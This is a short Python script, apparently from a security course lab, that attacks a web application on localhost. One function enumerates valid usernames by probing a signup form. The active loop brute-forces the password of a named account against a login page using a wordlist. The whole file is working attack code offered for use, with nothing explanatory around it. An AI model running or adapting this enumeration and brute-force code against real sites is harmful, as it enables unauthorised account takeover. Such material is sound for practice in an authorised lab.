import requests

lista = open("users.txt", "r").read().split("\n")

def Scrap(url, user):
    try:
        data = {
            "username": user,
            "password": "Mostafa",
            "confpassword": "Mostafa",
            "signup": "Signup"
        }

        req =requests.post(url, data=data).text
        if "Success" in req:
            print(f"Invalid User ===> {user}")
        else:
            print(f"Valid User ===> {user}")
            exit()
    except Exception as e:
        print(e)

url = "http://localhost/CIS/ch2/signup.php"
#for user in lista:
#    Scrap(url, user)





lista = open("users.txt", "r").read().split("\n")

def Password(url, password):
    try:
        data = {
            "username": "greeneks",
            "password": password,
            "login": "Login"
        }

        req =requests.post(url, data=data).text
        if "Invalid Username OR Password" in req:
            print(f"Invalid Password ===> {password}")
        else:
            print(f"Valid Password ===> {password}")
            exit()
    except Exception as e:
        print(e)

url = "http://localhost/CIS/ch2/login.php"
for password in lista:
    Password(url, password)